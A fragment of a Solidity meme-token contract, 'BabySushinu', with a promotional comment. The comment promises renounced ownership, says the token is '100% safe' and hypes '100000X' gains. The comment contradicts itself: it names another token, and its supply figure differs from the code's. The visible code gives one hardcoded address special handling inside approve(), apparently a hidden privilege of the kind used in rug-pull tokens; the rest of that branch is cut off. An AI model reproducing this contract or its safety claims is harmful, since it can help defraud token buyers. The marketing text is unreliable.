...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #BabySushinu.
   ...
   I will renounce the ownership to burn addresses to transfer #BabyUnicakeX to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #BabySushinu 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 BabySushinu max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #BabySushinu idea, increasing the liquidity pool automatically, 
...
contract BabySushinu {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "BabySushinu";
    string public symbol = "BabySushinu";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x9fC70EFBe4D7105D0FF161b2db51C8b93DeeeBcB)) {
